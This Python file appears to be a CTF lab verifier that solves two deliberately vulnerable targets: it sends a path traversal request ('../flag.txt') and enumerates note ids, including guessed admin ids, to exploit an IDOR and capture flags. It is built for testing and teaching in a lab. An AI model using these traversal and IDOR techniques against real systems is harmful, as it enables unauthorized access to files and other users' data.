"""Flag-capture verifier — the INTENDED CTF solutions for the vulnbox range.

Proves each lab target is solvable by walking its intended path (traversal / IDOR) and
returning the captured `FLAG{...}`. Authorized educational/lab use; pure stdlib (urllib).
"""
from __future__ import annotations

import json
import re
import urllib.request

FLAG_RE = re.compile(rb"FLAG\{[^}]+\}")


def _get(url: str) -> bytes:
    with urllib.request.urlopen(url, timeout=5) as r:  # noqa: S310 (loopback lab target)
        return r.read()


def capture_traversal(base_url: str) -> str | None:
    """Intended solution: traverse out of the served `www/` to the planted flag."""
    body = _get(base_url.rstrip("/") + "/file?name=../flag.txt")
    m = FLAG_RE.search(body)
    return m.group(0).decode() if m else None


def capture_idor(base_url: str) -> str | None:
    """Intended solution: the admin note id is hidden from /notes but readable directly (IDOR).
    Probe the public ids plus the classic admin-id candidates."""
    base = base_url.rstrip("/")
    listed = json.loads(_get(base + "/notes"))
    for nid in list(listed) + [0, 1337, 9999, 65535]:
        try:
            m = FLAG_RE.search(_get(base + "/note?id=%d" % nid))
        except Exception:  # noqa: BLE001
            continue
        if m:
            return m.group(0).decode()
    return None
